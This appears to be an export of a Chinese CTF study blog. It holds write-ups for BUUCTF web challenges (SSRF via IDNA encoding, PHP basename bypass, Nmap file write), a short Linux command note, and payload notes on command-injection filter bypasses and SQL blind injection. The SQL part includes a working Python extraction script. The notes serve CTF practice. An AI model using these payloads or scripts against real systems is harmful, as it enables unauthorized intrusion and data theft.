<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span><span class="comment"># !!!这个路由用于测试</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="comment"># hashlib.md5(secert_key + param + action).hexdigest()</span></span><br><span class="line"><span class="comment"># hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span></span><br></pre></td></tr></table></figure>

<p>通过这个路径可以获得sign，hashlib.md5(secert_key + param + action).hexdigest()，传入的参数一样即可。这里对action 进行了赋值，传入param要进行过滤，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br></pre></td></tr></table></figure>

<p>再查看Exec，获得传入的action 和param的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"># hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>两次提交的值要相等</p>
<p>参考文章：[(47条消息) BUUCTF <a href="https://blog.csdn.net/weixin_45642610/article/details/114322141">De1CTF 2019]SSRF Me 1_wow小华的博客-CSDN博客</a></p>
<h1 id="SUCTF-2019-Pythonginx1"><a href="#SUCTF-2019-Pythonginx1" class="headerlink" title="[SUCTF 2019]Pythonginx1"></a>[SUCTF 2019]Pythonginx1</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>():</span> </span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>) </span><br><span class="line">    host = parse.urlparse(url).hostname </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span> </span><br><span class="line">    </span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url)) </span><br><span class="line">    host = parts[<span class="number">1</span>] </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host newhost = [] </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>): newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment">#漏洞所在处</span></span><br><span class="line">        parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost) </span><br><span class="line">        <span class="comment">#去掉 url 中的空格 finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostname </span></span><br><span class="line">        <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: </span><br><span class="line">            <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read() <span class="comment">#通过这个验证，即可进行读取</span></span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure>

<p>在/getUrl这个路径下，用get的方式传入url这个参数，h.encode(‘idna’).decode(‘utf-8’)存在漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Demo:</span><br><span class="line">℆这个字符,如果使用python3进行idna编码的话</span><br><span class="line">print(‘℆’.encode(‘idna’))</span><br><span class="line">结果</span><br><span class="line">b’c/u’</span><br><span class="line">如果再使用utf-8进行解码的话</span><br><span class="line">print(b’c/u’.decode(‘utf-8’))</span><br><span class="line">结果</span><br><span class="line">c/u</span><br><span class="line">通过这种方法可以绕过网站的一些过滤字符</span><br></pre></td></tr></table></figure>

<h2 id="nginx重要文件的位置"><a href="#nginx重要文件的位置" class="headerlink" title="nginx重要文件的位置"></a><a href="https://so.csdn.net/so/search?q=nginx&spm=1001.2101.3001.7020">nginx</a>重要文件的位置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置文件存放目录：/etc/nginx</span><br><span class="line">主配置文件：/etc/nginx/conf/nginx.conf</span><br><span class="line">管理脚本：/usr/lib64/systemd/system/nginx.service</span><br><span class="line">模块：/usr/lisb64/nginx/modules</span><br><span class="line">应用程序：/usr/sbin/nginx</span><br><span class="line">程序默认存放位置：/usr/share/nginx/html</span><br><span class="line">日志默认存放位置：/var/log/nginx</span><br><span class="line">配置文件目录为：/usr/local/nginx/conf/nginx.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>读取文件，直接进行读取没有读出来，然后利用file://协议进行读取，读了出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=file://suctf.c℆sr/local/nginx/conf/nginx.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="网鼎杯-2020-朱雀组-Nmap1"><a href="#网鼎杯-2020-朱雀组-Nmap1" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap1"></a>[网鼎杯 2020 朱雀组]Nmap1</h1><p><strong>nmap的文件写入：</strong></p>
<ul>
<li>-oN 标准保存</li>
<li>-oX XML保存</li>
<li>-oG Grep保存</li>
<li>-oA 保存到所有格式</li>
<li>-append-output 补充保存文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -T5 -sT -Pn --host-timeout 2 -F </span><br><span class="line"></span><br><span class="line">-T5: 即Insane模式，适合快速的网络或者不在意丢失默些信息,对每台主机的超时限制为75秒,对每次探测只等待0.3秒</span><br><span class="line">-sT: TCP连接扫描</span><br><span class="line">-Pn: 无Ping扫描,可以躲避防火墙防护,可以在目标主机禁止ping的情况下使用</span><br><span class="line">-F : 快速扫描</span><br><span class="line">-oG: nmap -F -oG test.txt 192.168.23.1 将扫描结果保存到test.txt</span><br></pre></td></tr></table></figure>

<p>参考文章：[(47条消息) BUUCTF <a href="https://blog.csdn.net/weixin_44037296/article/details/110893526">网鼎杯 2020 朱雀组] Nmap_Senimo-CSDN博客</a></p>
<p>php被过滤了</p>
<h2 id="Zer0pts2020-Can-you-guess-it-1-正则绕过、basename缺陷"><a href="#Zer0pts2020-Can-you-guess-it-1-正则绕过、basename缺陷" class="headerlink" title="[Zer0pts2020]Can you guess it?1   正则绕过、basename缺陷"></a>[Zer0pts2020]Can you guess it?1   正则绕过、basename缺陷</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;<span class="keyword">If</span> your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 随机生成64位二进制字节，再转换位十六进制 赋值给$secret</span></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="comment"># hash_equals 可防止时序攻击的字符串比较 </span></span><br><span class="line">    <span class="comment"># 如果传入字符串长度和随机生成的字符串长度不一样 直接 false</span></span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>实现输出flag的方法有两种，一种是利用highlight_file函数，另外一种是利用$message = ‘Congratulations! The flag is: ‘ . FLAG;，但是实现第二种有点困难，要求随机产生的64位二进制字节转化为转换为16进制，并且要求传入的字符长度相等，很难实现。因此采用第一种。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;<span class="comment">//获得的文件名后面不能是config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果通过highlight_file去读取config.php 文件，这段代码看起来好像是不太行，通过传入 <code>/index.php/config.php</code> 会被正则直接拦下来。但是<code>basename</code> 这个函数有个小小的问题，就是文件名首尾任何非ASCII码的字符都会被rename函数删除掉</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php/config.php/%e4/?source</span><br></pre></td></tr></table></figure>

<p>[BUUCTF-WEB 【Zer0pts2020】Can you guess it 1 | Fan的小酒馆 (fanygit.github.io)](<a href="https://fanygit.github.io/2021/05/06/[Zer0pts2020]Can">https://fanygit.github.io/2021/05/06/[Zer0pts2020]Can</a> you guess it 1/)</p>
]]></content>
      <categories>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>linux caozuo</title>
    <url>/2022/01/14/linux-caozuo/</url>
    <content><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="查找目录-ls"><a href="#查找目录-ls" class="headerlink" title="查找目录 ls"></a>查找目录 ls</h2><p>.隐藏文件</p>
<p>.当前文件夹 </p>
<p>..上级目录</p>
<p>-a  全部文件   -l 显示详细信息  </p>
<p>ls -lh  查看详细信息</p>
<p><strong>通配符</strong></p>
<p>*可以代替任意个数的字符  模糊查找   ？只能代替一个</p>
<p>[1234]23.txt   [1-4]23.txt</p>
<h2 id="切换目录-cd"><a href="#切换目录-cd" class="headerlink" title="切换目录   cd"></a>切换目录   cd</h2><p>cd   cd ~   切换到当前目录的主目录</p>
<p>cd .. 切换到上级目录  </p>
<p>cd - 在最近使用的两个之间来回切换目录</p>
<h2 id="创建和删除操作"><a href="#创建和删除操作" class="headerlink" title="创建和删除操作"></a>创建和删除操作</h2><p>touch 文件名</p>
<p>mkdir 创建新目录   -p   递归创建</p>
<p>rm  删除   不能恢复</p>
<h2 id="拷贝和移动文件"><a href="#拷贝和移动文件" class="headerlink" title="拷贝和移动文件"></a>拷贝和移动文件</h2><p>tree 以树状图列出文件目录结构   -d 只显示目录</p>
<p><strong>cp</strong>  源文件 目标文件  cd ~/dss/ef.txt . </p>
<p>-i 覆盖文件前的提示</p>
<p>-r 复制目录</p>
<p>mv 要移动文件的源 文件  目标文件</p>
<p>grep 查找</p>
<h1 id="远程管理命令"><a href="#远程管理命令" class="headerlink" title="远程管理命令"></a>远程管理命令</h1><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>ssh -p 端口号 user@remote </p>
<p>exit 退出当前用户登录</p>
<p><img src="linux-caozuo.assets/image-20220114222034525.png" alt="image-20220114222034525"></p>
]]></content>
      <categories>
        <category>linux caozuo</category>
      </categories>
      <tags>
        <tag>linux caozuo</tag>
      </tags>
  </entry>
  <entry>
    <title>ping</title>
    <url>/2022/01/05/ping/</url>
    <content><![CDATA[<h1 id="GXYCTF2019-Ping-Ping-Ping-命令注入"><a href="#GXYCTF2019-Ping-Ping-Ping-命令注入" class="headerlink" title="[[GXYCTF2019]Ping Ping Ping]命令注入"></a>[[GXYCTF2019]Ping Ping Ping]命令注入</h1><p>1.管道符</p>
<p>； |  &amp;  常用</p>
<p>2.绕过</p>
<p>绕过空格</p>
<p>$IFS$9  &lt;,&lt;&gt;,%20(space),%09(tab),$IFS$9, I F S , {IFS},IFS,IFS</p>
<p>3.过滤单词</p>
<p>变量替换 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php </span><br></pre></td></tr></table></figure>

<p>过滤bash用sh执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh  </span><br><span class="line">//Y2F0IGZsYWcucGhw -&gt;cat flag.php,输出给base64还原然后sh执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>内联执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br><span class="line">//内联，就是将反引号内命令的输出作为输入执行。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>4.关键字过滤</p>
<h5 id="方法一：特殊变量"><a href="#方法一：特殊变量" class="headerlink" title="方法一：特殊变量"></a>方法一：特殊变量</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$*</span><br><span class="line">$@</span><br><span class="line">$x    (x 代表 1-9)</span><br><span class="line">$&#123;x&#125;   (x&gt;=10)</span><br><span class="line">在没有传参的情况下，上面的特殊变量都是为空的 ca$&#123;21&#125;t a.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="方法二：反斜杠"><a href="#方法二：反斜杠" class="headerlink" title="方法二：反斜杠"></a>方法二：反斜杠</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ca\t a.txt</span><br></pre></td></tr></table></figure>

<h5 id="方法三：变量替换"><a href="#方法三：变量替换" class="headerlink" title="方法三：变量替换"></a>方法三：变量替换</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=ca;b=t;c=a.txt;aaab $c</span><br></pre></td></tr></table></figure>

<h5 id="方法四：引号"><a href="#方法四：引号" class="headerlink" title="方法四：引号"></a>方法四：引号</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&#x27;a&#x27;t flag.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.&amp;</span><br><span class="line">&amp; 表示将任务置于后台执行</span><br><span class="line">2.&amp;&amp;</span><br><span class="line">只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才 会被执行。</span><br><span class="line">3.|</span><br><span class="line">| 表示管道，上一条命令的输出，作为下一条命令的参数</span><br><span class="line">4.||</span><br><span class="line">只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才 会被执行。</span><br><span class="line">5.；</span><br><span class="line">多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>更多详情，查看以下文章</p>
<p>参考文章：[<a href="https://www.cnblogs.com/HelloCTF/p/13051220.html">GXYCTF2019]Ping Ping Ping(ping命令执行绕过Waf) - Hel10 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/qq_45655564/article/details/117395152">(41条消息) 命令注入————ctfhub（过滤cat、空格、目录分隔符、运算符、综合过滤练习）_小Low娃的博客-CSDN博客_ctfhub 命令注入 综合过滤</a></p>
]]></content>
      <categories>
        <category>ping</category>
      </categories>
      <tags>
        <tag>ping</tag>
      </tags>
  </entry>
  <entry>
    <title>sql</title>
    <url>/2021/12/26/sql/</url>
    <content><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h1><h2 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1^1=0 0^0=0 0^1=1`</span><br><span class="line">`1^1^1=0 1^1^0=0`</span><br><span class="line">构造payload:`&#x27;^ascii(mid(database(),1,1)=98)^0</span><br></pre></td></tr></table></figure>

<p>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://116b4987-7158-432b-a5f2-f3b0154b1157.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">	<span class="string">&quot;id&quot;</span> : <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	l = <span class="number">32</span></span><br><span class="line">	r =<span class="number">128</span></span><br><span class="line">	mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">	<span class="keyword">while</span>(l&lt;r):</span><br><span class="line">		payload[<span class="string">&quot;id&quot;</span>] = <span class="string">&quot;0^(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">		ly0n = requests.post(url,data=payload)</span><br><span class="line">		<span class="comment">#print(payload)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> ly0n.text:</span><br><span class="line">			l = mid+<span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			r = mid</span><br><span class="line">		mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">chr</span>(mid)==<span class="string">&quot; &quot;</span>):</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	result = result + <span class="built_in">chr</span>(mid)</span><br><span class="line">	<span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag: &quot;</span> ,result)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;^(ascii(mid((password)from(i)))&gt;j)^&#x27;1&#x27;=&#x27;1&#x27;%23</span><br><span class="line">或者</span><br><span class="line">admin&#x27;^(ascii(mid((password)from(i)for(1)))&gt;j)^&#x27;1&#x27;=&#x27;1&#x27;%23</span><br></pre></td></tr></table></figure>

<p>0^1^0 <em>–&gt; 1 语句返回为真</em> 0^0^0 <em>–&gt; 0 语句返回为假</em></p>
<h4 id="过滤了关键字：and、or过滤了逗号，过滤了空格"><a href="#过滤了关键字：and、or过滤了逗号，过滤了空格" class="headerlink" title="过滤了关键字：and、or过滤了逗号，过滤了空格"></a>过滤了关键字：and、or过滤了逗号，过滤了空格</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27;^(ascii(mid((password)from(i)))&gt;j)^(&#x27;2&#x27;&gt;&#x27;1&#x27;)%23</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>如果这里过滤了%号和注释符的话，那就把最后一个引号去掉就可以和后面的引号匹配了 ‘1’=’1</strong></p>
<h2 id="regexp-注入"><a href="#regexp-注入" class="headerlink" title="regexp****注入"></a><strong>regexp****注入</strong></h2><p>基本注入语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select (select语句) regexp &#x27;正则&#x27;</span><br></pre></td></tr></table></figure>

<p>接着进行正则注入，若匹配则返回1，不匹配返回0</p>
<p>regexp这个关键字还可以代替where条件里的=号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select (select user_pass from users where user_id = 1) regexp &#x27;^a&#x27;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过滤了=、in、like</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select (select user_pass from users where user_id = 1) regexp &#x27;bd3$&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h2><p>基本注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where user_id = &#x27;1&#x27; union select 1,2,&#x27;a&#x27;,4,5,6,7 order by 3</span><br></pre></td></tr></table></figure>

<p>过滤了列名，过滤了括号，适用于已知该表的列名以及列名位置的注入</p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>一般有个注册页面，然后还有一个修改的页面，里面按照所学知识进行注入</p>
<h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><h3 id="BUUCTF-WEB-【GYCTF2020】Ezsqli-1-Fan的小酒馆-fanygit-github-io-https-fanygit-github-io-2021-08-21-GYCTF2020-Ezsqli-1-msclkid-75a0462da7f211ecb8afadeb73123d5b"><a href="#BUUCTF-WEB-【GYCTF2020】Ezsqli-1-Fan的小酒馆-fanygit-github-io-https-fanygit-github-io-2021-08-21-GYCTF2020-Ezsqli-1-msclkid-75a0462da7f211ecb8afadeb73123d5b" class="headerlink" title="[BUUCTF-WEB 【GYCTF2020】Ezsqli 1 | Fan的小酒馆 (fanygit.github.io)](https://fanygit.github.io/2021/08/21/[GYCTF2020]Ezsqli 1/?msclkid=75a0462da7f211ecb8afadeb73123d5b)"></a>[BUUCTF-WEB 【GYCTF2020】Ezsqli 1 | Fan的小酒馆 (fanygit.github.io)](<a href="https://fanygit.github.io/2021/08/21/[GYCTF2020]Ezsqli">https://fanygit.github.io/2021/08/21/[GYCTF2020]Ezsqli</a> 1/?msclkid=75a0462da7f211ecb8afadeb73123d5b)</h3><p>当我们通过暴力破解获取到表名后，如何利用呢？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</span><br></pre></td></tr></table></figure>

<p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 CTF 题目中，information_schema 库被过滤，使用这种方法获取列名。</p>
<p>无列名注入的原理其实很简单，类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询，所以，如果我们查询的字段多于数据表中列的时候，就会出现报错。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.获取字段数，用order by 或 group by</span><br><span class="line"></span><br><span class="line">2.列名为 id、name、password  列名被替换成对应的数字</span><br><span class="line">  select 1,2,3 union select * from admin;</span><br><span class="line">  </span><br><span class="line">3.数字对应列，获取某一列的信息（末尾的 a 可以是任意字符，用于命名。）</span><br><span class="line">  select `3` from (select 1,2,3 union select * from   admin)a;</span><br><span class="line">多数情况下，` 会被过滤。当 ` 不能使用的时候，使用别名来代替：</span><br><span class="line">  select b from (select 1,2,3 as b union select *     from admin)a;</span><br><span class="line"> 同时查询多个列</span><br><span class="line"> select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from admin)a limit 1,3;</span><br><span class="line"> </span><br><span class="line">4.</span><br><span class="line">  select a,b from posts where a=-1 union select 1,   (select concat(`3`,0x2d,`4`) from (select           1,2,3,4,5,6 union select * from xxx)a limit       1,1);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="用-sys-schema-auto-increment-columns-来注表名"><a href="#用-sys-schema-auto-increment-columns-来注表名" class="headerlink" title="用 sys.schema_auto_increment_columns 来注表名"></a>用 sys.schema_auto_increment_columns 来注表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格 和 or 被过滤，报错过滤了extractvalue 和 updatexml，于是考虑用 union 联合注入。</span><br><span class="line">1.111&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><br><span class="line"></span><br><span class="line">2.111&#x27;/**/union/**/select/**/1,(select/**/aaa/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><br><span class="line"></span><br><span class="line">3.111&#x27;/**/union/**/select/**/1,(select/**/bbb/**/from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/users)a/**/limit/**/1,1),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select table_schema from sys.schema_auto_increment_columns;　　//查数据库</span><br><span class="line"></span><br><span class="line"> select table_name from sys.schema_auto_increment_columns where table_schema = &#x27;test&#x27;;　　//查表</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

